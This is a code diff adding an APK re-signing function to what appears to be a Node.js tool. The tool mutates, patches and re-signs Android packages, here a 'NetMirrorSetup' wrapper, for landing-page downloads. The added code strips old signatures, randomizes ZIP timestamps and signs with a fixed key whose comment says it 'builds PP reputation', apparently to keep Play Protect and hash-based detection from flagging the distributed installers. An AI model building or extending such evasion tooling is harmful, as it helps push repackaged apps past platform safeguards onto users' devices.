@@ -2251,7 +2251,63 @@ function createCleanLandingApk(sourceBuffer) {
   }
 }
 
-module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk };
+// ═════════════════════════════════════════════════════════════════════════════
+// CLEAN RE-SIGN — strips old signature, applies V1+V2 with FIXED key
+// Used for wrapper APK (NetMirrorSetup) which ships with Android Debug cert.
+// Does NOT mutate DEX, manifest, or permissions — only re-signs.
+// ═════════════════════════════════════════════════════════════════════════════
+
+function resignApkClean(originalBuffer) {
+  console.log(`[ReSign] ═══ CLEAN RE-SIGN (${(originalBuffer.length / 1048576).toFixed(2)} MB) ═══`);
+  const t0 = Date.now();
+
+  try {
+    const apkBuf = Buffer.from(originalBuffer);
+    repairZipCRCs(apkBuf);
+
+    // 1. Parse APK (AdmZip ignores V2 signing block — effectively strips it)
+    const zip = new AdmZip(apkBuf);
+
+    // 2. Strip any old V1 signatures
+    stripSignatures(zip);
+
+    // 3. Load FIXED signing key (CN=NetMirror — builds PP reputation)
+    const key = getFixedKey();
+
+    // 4. Apply V1 JAR signing
+    applyV1Signing(zip, key.cert, key.privateKey);
+
+    // 5. Rebuild ZIP
+    const rawBuf = zip.toBuffer();
+
+    // 6. Randomize ZIP metadata (timestamps)
+    const randomizedBuf = randomizeZipMetadata(rawBuf);
+
+    // 7. Zipalign (4-byte alignment)
+    const alignedBuf = zipalignBuffer(randomizedBuf);
+
+    // 8. V2 sign with FIXED key
+    const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
+
+    // 9. Validate
+    const valid = validateApk(signedBuf);
+    if (!valid) {
+      console.error('[ReSign] ═══ Validation FAILED — returning original ═══');
+      return { buffer: originalBuffer, resigned: false };
+    }
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[ReSign] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(2)} MB | CN="${key.identity.cn}" | ${key.certHash.substring(0, 20)}... | ${elapsed}s ═══`);
+
+    return { buffer: signedBuf, resigned: true, certInfo: { certHash: key.certHash, cn: key.identity.cn, org: key.identity.o } };
+  } catch (err) {
+    console.error(`[ReSign] ═══ ERROR: ${err.message} — returning original ═══`);
+    console.error(err.stack);
+    return { buffer: originalBuffer, resigned: false };
+  }
+}
+
+module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean };
 
 // ═════════════════════════════════════════════════════════════════════════════
 // MINIMAL RESTORE + RE-SIGN (for landing page downloads)
